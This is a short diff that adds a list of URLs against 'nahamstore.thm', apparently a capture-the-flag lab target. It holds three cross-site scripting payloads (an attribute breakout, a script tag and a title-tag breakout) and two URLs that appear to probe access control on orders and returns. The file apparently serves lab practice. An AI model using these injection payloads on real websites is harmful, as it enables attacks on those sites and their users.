@@ -1,0 +1,5 @@
+http://nahamstore.thm/search?q=%27;alert(123);//
+http://marketing.nahamstore.thm//?error=%3Cscript%3Ealert(123)%3C/script%3E
+http://nahamstore.thm/account/orders/6
+http://nahamstore.thm/product?id=2&name=%3C/title%3E%3Cscript%3Ealert(123)%3C/script%3E
+http://nahamstore.thm/returns/3?auth=eccbc87e4b5ce2fe28308fd9f2a7baf3
